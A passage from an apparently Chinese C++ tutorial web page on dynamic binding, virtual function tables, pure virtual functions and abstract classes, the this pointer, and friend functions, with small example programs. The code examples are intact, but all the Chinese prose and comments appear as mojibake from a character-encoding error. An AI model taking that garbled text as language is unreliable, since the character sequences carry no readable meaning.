æ­¤åªèƒ½ç­‰åˆ°è¿è¡Œæ—¶ç¡®å®šï¼Œè¿™å°±æ˜¯æ‰€è°“çš„åŠ¨æ€ç»‘å®šã€‚</p><p>åŠ¨æ€ç»‘å®šçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;C::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A* a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// è°ƒç”¨çš„æ˜¯ B::print()</span></span><br><span class="line">    a = <span class="keyword">new</span> <span class="built_in">C</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// è°ƒç”¨çš„æ˜¯ C::print()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052225623.png"></p><p><strong>æ³¨æ„</strong>ï¼šåŠ¨æ€ç»‘å®šçš„å‰ææ˜¯åŸºç±»ä¸­çš„å‡½æ•°è¢« <code>virtual</code> å…³é”®è¯å£°æ˜ä¸ºè™šå‡½æ•°æ‰è¡Œï¼Œå¦‚æœä¸Šè¿°ä»£ç å°†åŸºç±»ä¸­çš„ <code>virtual</code> å…³é”®è¯å»æ‰ï¼Œé‚£ä¹ˆè¾“å‡ºç»“æœå°±ä¸ºä¸¤ä¸ª <code>A::print</code> ã€‚å› ä¸ºç¼–è¯‘å™¨åœ¨å¤„ç†çš„æ—¶å€™å‘ç°æ²¡æœ‰ <code>virtual</code> å°±ä¸ä¼šè®¤ä¸ºè¿™æ˜¯è™šå‡½æ•°ï¼Œ<strong>ä»è€Œä½ ä½¿ç”¨åŸºç±»çš„æŒ‡é’ˆå³ä½¿è°ƒç”¨æ´¾ç”Ÿç±»ä¸­çš„å‡½æ•°ä¾ç„¶è°ƒç”¨çš„æ˜¯åŸºç±»ä¸­çš„å‡½æ•°ï¼Œä¾ç„¶ä¸ä¼šå»è€ƒè™‘æŒ‡é’ˆæ‰€æŒ‡å‘çš„å¯¹è±¡çš„å®é™…ç±»å‹</strong>ã€‚</p><h4 id="è™šå‡½æ•°-amp-amp-è™šå‡½æ•°è¡¨-amp-amp-è™šè¡¨æŒ‡é’ˆ"><a href="#è™šå‡½æ•°-amp-amp-è™šå‡½æ•°è¡¨-amp-amp-è™šè¡¨æŒ‡é’ˆ" class="headerlink" title="è™šå‡½æ•°&amp;&amp;è™šå‡½æ•°è¡¨&amp;&amp;è™šè¡¨æŒ‡é’ˆ"></a>è™šå‡½æ•°&amp;&amp;è™šå‡½æ•°è¡¨&amp;&amp;è™šè¡¨æŒ‡é’ˆ</h4><p>ä¸Šé¢çš„é‚£æ®µæ–‡å­—ä¸­å‡ºç°äº†è™šå‡½æ•°è¿™ä¸ªé™Œç”Ÿçš„æ¦‚å¿µï¼Œè¿™é‡Œæ¥è®²ä¸€ä¸‹åŠ¨æ€ç»‘å®šæ˜¯å¦‚ä½•è¢«å®ç°çš„ã€‚</p><p>æ¥ä¸‹æ¥å°†æåˆ°ä¸‰ä¸ªæ¦‚å¿µï¼Œåˆ†åˆ«æ˜¯è™šå‡½æ•°ï¼Œè™šå‡½æ•°è¡¨å’Œè™šè¡¨æŒ‡é’ˆã€‚</p><p>ç®€å•è§£é‡Šä¸€ä¸‹ï¼Œè™šå‡½æ•°è¡¨å…¶å®å°±æ˜¯ä¸€ä¸ª<strong>å‡½æ•°æŒ‡é’ˆæ•°ç»„</strong>ï¼ˆå°±æ˜¯å­˜æ”¾è™šå‡½æ•°æŒ‡é’ˆçš„ä¸€ä¸ªæ•°ç»„ï¼‰ï¼Œè™šè¡¨æŒ‡é’ˆåˆ™æ˜¯æŒ‡å‘è™šå‡½æ•°è¡¨çš„ä¸€ä¸ª<strong>æŒ‡é’ˆ</strong>ï¼Œè™šå‡½æ•°åˆ™æ˜¯è¢« <code>virtual</code> å…³é”®å­—å£°æ˜çš„å‡½æ•°ã€‚</p><p>æˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹è¿™ä¸ªåŠ¨æ€ç»‘å®šï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºç±»çš„æŒ‡é’ˆï¼Œå¯ä»¥å»æŒ‡å‘æ´¾ç”Ÿç±»å®ä¾‹åçš„å¯¹è±¡ï¼Œä»è€Œå»è°ƒç”¨æ´¾ç”Ÿç±»ä¸­çš„å‡½æ•°ï¼Œå¹¶ä¸”æŒ‡å‘ä¸åŒçš„æ´¾ç”Ÿç±»çš„å¯¹è±¡ï¼Œå¯ä»¥è°ƒç”¨åŒä¸€ä¸ªå‡½æ•°åä½†ä½œç”¨ä¸åŒçš„å‡½æ•°ï¼ˆè¿™ä¸ªå°±æ˜¯å‡½æ•°çš„å¤šæ€æ€§ï¼‰ã€‚å…·ä½“å®ç°è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆåœ¨åŸºç±»Aä¸­å®šä¹‰äº†è™šå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»Aå°±ä¼šæ‹¥æœ‰ä¸€ä¸ªè™šå‡½æ•°è¡¨ï¼Œè¿™ä¸ªè¡¨ä¸­ä¼šå­˜æ”¾åŸºç±»Aä¸­æ‰€æœ‰çš„è™šå‡½æ•°åœ°å€ï¼ˆä¸æ˜¯è™šå‡½æ•°çš„è¯ï¼Œå°±ä¸ä¼šå°†åœ°å€æ”¾åˆ°è¿™ä¸ªè™šå‡½æ•°è¡¨ä¸­ï¼‰</p><p>æ–¹ä¾¿ç†è§£ï¼Œç”»äº†ä¸ªç¤ºæ„å›¾</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052306391.png" alt="image-20230105230622294" style="zoom:50%;" /><p>ç„¶ååŸºç±»Aå®ä¾‹åŒ–äº†ä¸€ä¸ªå¯¹è±¡ï¼Œåä¸º <code>a</code> ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡å†…éƒ¨å°†åŒ…å«ä¸€ä¸ªè™šè¡¨æŒ‡é’ˆ <code>*__vptr</code>ï¼ˆè¿™æ˜¯ç¼–è¯‘å™¨è¿›è¡Œæ·»åŠ çš„ï¼‰ï¼Œè¿™ä¸ªè™šè¡¨æŒ‡é’ˆå°±æŒ‡å‘äº†è‡ªå·±è¿™ä¸ªç±»çš„è™šå‡½æ•°è¡¨ã€‚</p><p>ä¸‹é¢ä¸¤ä¸ªå›¾åˆ†åˆ«æ˜¯æœ‰è™šå‡½æ•°å’Œæ²¡æœ‰è™šå‡½æ•°çš„ç±»ï¼Œå¯ä»¥çœ‹è§ä»–ä»¬çš„å¤§å°å·®äº†å…«ä¸ªå­—èŠ‚ï¼Œåˆšå¥½æ˜¯64ä½ç¨‹åºé‡Œä¸€ä¸ªæŒ‡é’ˆçš„å¤§å°ï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆå°±æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨æ·»åŠ çš„è™šè¡¨æŒ‡é’ˆã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052313274.png" alt="image-20230105231306685"></p><p><strong>åŸºç±»ä¸­å¦‚æœå­˜åœ¨è™šå‡½æ•°è¡¨çš„è¯ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»åˆ™ä¼šå°†è™šå‡½æ•°è¡¨ä¹Ÿç»§æ‰¿ä¸‹æ¥</strong>ï¼Œå¦‚æœ<u>æ´¾ç”Ÿç±»ä¸­æ²¡æœ‰å¯¹åŸºç±»ä¸­çš„å‡½æ•°è¿›è¡Œé‡æ–°å®šä¹‰ï¼Œé‚£ä¹ˆè™šå‡½æ•°ä¸­çš„å‡½æ•°æŒ‡é’ˆä¸å˜ï¼Œå¦‚æœæ´¾ç”Ÿç±»å¯¹æŸä¸ªåŸºç±»ä¸­çš„å‡½æ•°è¿›è¡Œäº†é‡æ–°å®šä¹‰ï¼Œé‚£ä¹ˆè™šå‡½æ•°è¡¨ä¸­çš„å‡½æ•°æŒ‡é’ˆå°†è¢«æ›´æ–°ä¸ºæ–°çš„è™šå‡½æ•°åœ°å€ã€‚åŒæ ·çš„ï¼Œæ´¾ç”Ÿç±»å®ä¾‹åŒ–åçš„å¯¹è±¡ä¹Ÿå…·æœ‰ä¸€ä¸ªè™šè¡¨æŒ‡é’ˆï¼Œæ¥æŒ‡å‘æ´¾ç”Ÿç±»è‡ªå·±çš„è™šå‡½æ•°è¡¨</u>ã€‚</p><p>ä»¥ä¸‹é¢çš„ä»£ç ä¸ºä¾‹ï¼Œå…·ä½“è¯´æ˜ä¸€ä¸‹åŠ¨æ€ç»‘å®šçš„å®ç°è¿‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;C::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A* a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// è°ƒç”¨çš„æ˜¯ B::print()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œ <code>A* a = new B()</code> å®šä¹‰äº†ä¸€ä¸ªç±»Açš„æŒ‡é’ˆaï¼ˆäº‹å®ä¸Šæ¥ä¸‹æ¥è¦è¯´çš„å’ŒæŒ‡é’ˆç±»å‹æ²¡æœ‰å…³ç³»ï¼Œå³ä½¿è¿™é‡Œæ˜¯ç±»BæŒ‡é’ˆä¹Ÿå®Œå…¨å¯ä»¥ï¼‰ï¼Œç„¶åå°†Bç±»å®ä¾‹åŒ–ä¸ºå¯¹è±¡çš„åœ°å€èµ‹å€¼ç»™äº† <code>a</code>ï¼Œæ‰€ä»¥å½“å‰ <code>a</code> å¯ä»¥é€šè¿‡å¯¹è±¡ä¸­è‡ªå·±å­˜å‚¨çš„ä¸€ä¸ª <code>vptr</code> æŒ‡é’ˆæ¥è®¿é—®åˆ°ç±»Bçš„è™šå‡½æ•°è¡¨ï¼Œä»è€Œå»ç±»Bçš„è™šå‡½æ•°ä¸­æ‰¾åˆ° <code>print</code>çš„å‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨ï¼Œæœ€ç»ˆè¾“å‡º <code>B::print</code> ã€‚</p><p><strong>æ³¨æ„ï¼šè™½ç„¶ä¸Šè¿°æ“ä½œå’Œ <code>a</code> æŒ‡é’ˆçš„ç±»å‹æ— å…³ï¼Œä½†æ˜¯ä¸å¯ä»¥å®šä¹‰ä¸ºç±»Cçš„æŒ‡é’ˆï¼ˆä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæŒ‡é’ˆçš„ç±»å‹è¦ä¹ˆæ˜¯åŸºç±»ï¼Œè¦ä¹ˆæ˜¯å½“å‰è¿™ä¸ªæ´¾ç”Ÿç±»ï¼‰ï¼Œå› ä¸ºè¿™æ ·ä¼šå¾—åˆ°ä¸€ä¸ªç¼–è¯‘é”™è¯¯ã€‚</strong></p><h3 id="çº¯è™šå‡½æ•°-amp-amp-æŠ½è±¡ç±»"><a href="#çº¯è™šå‡½æ•°-amp-amp-æŠ½è±¡ç±»" class="headerlink" title="çº¯è™šå‡½æ•°&amp;&amp;æŠ½è±¡ç±»"></a>çº¯è™šå‡½æ•°&amp;&amp;æŠ½è±¡ç±»</h3><p>çº¯è™šå‡½æ•°æ˜¯ä¸€ç§<strong>è™šå‡½æ•°</strong>ï¼Œå®ƒæ²¡æœ‰å®é™…å®ç°ï¼Œ<strong>åªæœ‰å¯¹å‡½æ•°çš„å£°æ˜</strong>ã€‚çº¯è™šå‡½æ•°æ˜¯é€šè¿‡åœ¨<strong>å‡½æ•°å£°æ˜çš„æœ«å°¾æ·»åŠ ä¸€ä¸ª <code>=0</code> æ¥å®šä¹‰çš„</strong>ï¼Œ<strong>çº¯è™šå‡½æ•°çš„ç›®çš„å°±æ˜¯è¦è®©åŸºç±»çš„æ´¾ç”Ÿç±»å»å®ç°å®ƒ</strong>ã€‚</p><p>çº¯è™šå‡½æ•°çš„å®šä¹‰å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¦‚æœå•çº¯çš„çœ‹çº¯è™šå‡½æ•°ï¼Œæ„Ÿè§‰è¿™æ ·åšä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ã€‚ä½†äº‹å®ä¸Šçº¯è™šå‡½æ•°æ˜¯ä¸ºæŠ½è±¡ç±»æ¥æœåŠ¡çš„ï¼Œå¦‚æœä¸€ä¸ªç±»ä¸­åŒ…å«äº†çº¯è™šå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±æ˜¯æŠ½è±¡ç±»ï¼Œ<strong>æŠ½è±¡ç±»æ— æ³•è¢«åˆ›å»ºå¯¹è±¡ï¼Œå®ƒçš„ä½œç”¨æ˜¯ä¸ºå…¶ä»–ç±»æä¾›ä¸€ä¸ªåŸºç±»</strong>ï¼Œå‡å¦‚æœ‰ä¸€ä¸ªæŠ½è±¡ç±» <code>Animal</code> ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªçº¯è™šå‡½æ•° <code>makeSound</code> ï¼Œä¹‹åæˆ‘ä»¬å¯ä»¥åˆ›å»ºæ¯”å¦‚ <code>cat</code> <code>dog</code> è¿™æ ·çš„æ´¾ç”Ÿç±»ï¼Œè¿™æ ·æˆ‘å»æ¯ä¸ªå…·ä½“çš„æ´¾ç”Ÿç±»é‡Œé¢æ¥å®ç° <code>makeSound</code>ã€‚ä½ å¯ä»¥å°†æŠ½è±¡ç±»ç†è§£ä¸ºæŸäº›äº‹ç‰©å¿…æœ‰çš„ä¸€äº›ç‰¹æ€§ï¼Œè€Œå…·ä½“çš„ç‰¹æ€§åˆä¼šæ ¹æ®äº‹ç‰©çš„ä¸åŒè€Œè¦é‡æ–°å®šä¹‰ï¼Œå°±æ¯”å¦‚åˆšåˆšæåˆ°çš„ <code>makeSound</code> ï¼Œåœ¨åŠ¨ç‰©ä¸­ä¸€å®šéƒ½å¯ä»¥å‘å‡ºå£°éŸ³ï¼Œä½†æ˜¯æ¯ä¸ªåŠ¨ç‰©å‘å‡ºçš„å£°éŸ³éƒ½ä¸ä¸€æ ·ï¼Œå› æ­¤æˆ‘ä»¬å…ˆå®šä¹‰ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œè‡³äºæ¯ä¸ªåŠ¨ç‰©å‘å‡ºçš„å£°éŸ³åœ¨å…·ä½“çš„æ´¾ç”Ÿç±»ä¸­å†å»å®ç°ã€‚</p><p>ä¸‹é¢å†™ä¸€ä¸ªæŠ½è±¡ç±»ä¸çº¯è™šå‡½æ•°çš„ä»£ç </p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Wang&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cat</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;miao&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Animal *p=<span class="keyword">new</span> <span class="built_in">dog</span>();</span><br><span class="line">p-&gt;<span class="built_in">makeSound</span>();</span><br><span class="line">p=<span class="keyword">new</span> <span class="built_in">cat</span>();</span><br><span class="line">p-&gt;<span class="built_in">makeSound</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061628111.png" alt="image-20230106162845748"></p><h3 id="thisæŒ‡é’ˆ"><a href="#thisæŒ‡é’ˆ" class="headerlink" title="thisæŒ‡é’ˆ"></a>thisæŒ‡é’ˆ</h3><p><code>this</code> æŒ‡é’ˆæ˜¯ç±»ä¸­æˆå‘˜å‡½æ•°çš„ä¸€ä¸ªéšå«å‚æ•°ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½å¯ä»¥é€šè¿‡ <code>this</code> æŒ‡é’ˆæ¥è®¿é—®è‡ªå·±çš„åœ°å€ã€‚</p><p>è¿™ä¸ªä¸»è¦ä¸€ä¸ªç”¨å¤„æ˜¯å¯ä»¥åŒºåˆ†ç±»ä¸­çš„æˆå‘˜å’Œå‡½æ•°å±€éƒ¨å˜é‡ï¼Œå‡å¦‚æœ‰å¦‚ä¸‹ä»£ç </p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_x</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x=x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_x</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;x is &quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A a;</span><br><span class="line">a.<span class="built_in">set_x</span>(<span class="number">60</span>);</span><br><span class="line">a.<span class="built_in">output_x</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸æ¥è¯´ï¼Œæˆ‘ä»¬çš„æœ¬æ„æ˜¯å¸Œæœ›èµ‹å€¼ç»™ç±»ä¸­çš„æˆå‘˜ <code>x</code> ï¼Œä½†æ˜¯åœ¨ <code>set_x</code> å‡½æ•°ä¸­xè¿›è¡Œèµ‹å€¼çš„æ—¶å€™ï¼Œç¨‹åºè®¤ä¸ºæ˜¯èµ‹å€¼ç»™å‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡ <code>x</code> ã€‚æ‰€ä»¥å»è¾“å‡ºæˆå‘˜å˜é‡ <code>x</code> çš„æ—¶å€™å°±å‘ç”Ÿäº†é”™è¯¯ï¼Œå¦‚ä¸‹è¿è¡Œç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061748632.png" alt="image-20230106174845468"></p><p>å› æ­¤è¿™é‡Œæˆ‘ä»¬æƒ³å¼ºè°ƒèµ‹å€¼çš„æ˜¯ç»™ç±»ä¸­çš„æˆå‘˜å˜é‡ <code>x</code>ï¼Œå°±å¯ä»¥å†™æˆ <code>this-&gt;x</code>ï¼Œæ­¤æ—¶çš„è¿è¡Œç»“æœå°±ä¼šæ­£å¸¸ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061752361.png" alt="image-20230106175223292"></p><p><strong>æ³¨æ„ï¼šåªæœ‰åœ¨ç±»çš„æˆå‘˜å‡½æ•°å†…éƒ¨æ‰èƒ½ä½¿ç”¨ <code>this</code> ï¼Œåœ¨å…¶ä»–å‡½æ•°ä¸­ä½¿ç”¨ <code>this</code> æ˜¯æ— æ•ˆçš„</strong></p><h3 id="å‹å…ƒå‡½æ•°"><a href="#å‹å…ƒå‡½æ•°" class="headerlink" title="å‹å…ƒå‡½æ•°"></a>å‹å…ƒå‡½æ•°</h3><p>ä¸Šé¢æåˆ°ï¼Œå¦‚æœæŸä¸ªæˆå‘˜å˜é‡ç”¨ <code>private</code> è¿›è¡Œäº†ä¿®é¥°ï¼Œé‚£ä¹ˆå°±å¾—é€šè¿‡ç±»ä¸­å®šä¹‰çš„å…¬æœ‰å‡½æ•°æ¥è¿›è¡Œè®¿é—®ï¼Œä½†æ˜¯æœ‰è¿™æ ·ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œ<strong>å®ƒåœ¨ç±»ä¸­å£°æ˜</strong>ï¼Œå…·ä½“çš„å®šä¹‰åœ¨ç±»çš„å¤–é¢ï¼Œæœ€å…³é”®çš„æ˜¯å®ƒæ‹¥æœ‰è®¿é—®ç§æœ‰ï¼ˆ <code>pritvate</code> ï¼‰æˆå‘˜å’Œå—ä¿æŠ¤ï¼ˆ<code>protected</code>ï¼‰æˆå‘˜çš„ç‰¹æ€§ã€‚è¿™æ ·çš„å‡½æ•°å°±å«åš<strong>å‹å…ƒå‡½æ•°</strong></p><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> price;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_price</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;price is &quot;</span> &lt;&lt; price &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">set_price</span><span class="params">(A&amp; a,<span class="type">int</span> n)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_price</span><span class="params">(A&amp; a,<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">a.price=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A a;</span><br><span class="line"><span class="built_in">set_price</span>(a,<span class="number">30</span>);<span class="comment">//ä¸éœ€è¦å£°æ˜aå¯¹è±¡è°ƒç”¨äº†set_priceå‡½æ•°</span></span><br><span class="line">a.<span class="built_in">output_price</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061935757.png" alt="image-20230106193519661"></p><p>å¯ä»¥çœ‹è§ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘å¹¶æ²¡æœ‰åœ¨å®šä¹‰çš„éƒ¨åˆ†å†™æˆ <code>A::set_price(A&amp; a,int n)</code>ï¼Œä½†ä¾ç„¶å¯ä»¥è®¿é—®åˆ°ç±» <code>A</code> ä¸­çš„å±æ€§ã€‚ä½†è¦æ³¨æ„çš„æ˜¯ï¼Œ <code>set_price</code> å‡½æ•°ä¼ å‚çš„æ—¶å€™ï¼Œè¦æä¾›å¯¹è±¡ <code>a</code> çš„å¼•ç”¨ï¼Œå¦‚æœè¿™é‡Œä»…ä»…æ˜¯ä¼ é€’è¿›å»äº†å¯¹è±¡ <code>a</code> é‚£ä¹ˆä¿®æ”¹çš„åªæ˜¯ <code>a</code> çš„å‰¯æœ¬ï¼Œå¹¶æ²¡æœ‰å¯¹åŸæœ¬çš„å®ä¾‹é€ æˆä»»ä½•æ”¹å˜ï¼ˆå‡½æ•°çš„å‚æ•°å¦‚æœç›´æ¥ä¼ é€’çš„æ˜¯å¯¹è±¡ï¼Œé‚£ä¹ˆä»…ä»…æ˜¯æ‹·è´ä¸€ä¸ªå‰¯æœ¬è¿›å»ï¼‰ã€‚</p><p>å…³äºå‹å…ƒå‡½æ•°æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š</p><ol><li>å‹å…ƒå‡½æ•°ä¸æ˜¯ç±»çš„æˆå‘˜å‡½æ•°ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨ç±»çš„ç¤ºä¾‹æˆå‘˜è®¿é—®ç¬¦ <code>.</code> æˆ–æˆå‘˜æŒ‡é’ˆè¿ç®—ç¬¦ <code>-&gt;</code> æ¥è°ƒç”¨å‹å…ƒå‡½æ•°ï¼ŒåŒæ ·å› ä¸ºè¿™ä¸ªåŸå› ï¼Œå‹å…ƒå‡½æ•°ä¹Ÿæ²¡æœ‰ <code>this</code> æŒ‡é’ˆã€‚</li><li>å‹å…ƒå‡½æ•°çš„å£°æ˜åªèƒ½å‡ºç°åœ¨ç±»çš„å®šä¹‰ä¸­ï¼Œè€Œä¸èƒ½å‡ºç°åœ¨ç±»çš„å®ç°ä¸­ã€‚</li><li>å‹å…ƒå‡½æ•°å¯ä»¥è®¿é—®ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…æ‹¬ç§æœ‰æˆå‘˜å’Œå…¬æœ‰æˆå‘˜ä»¥åŠå—ä¿æŠ¤æˆå‘˜ï¼Œå› æ­¤å‹å…ƒå‡½æ•°ä¸å—ç±»çš„è®¿é—®æ§åˆ¶çš„é™åˆ¶ã€‚</li></ol><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" 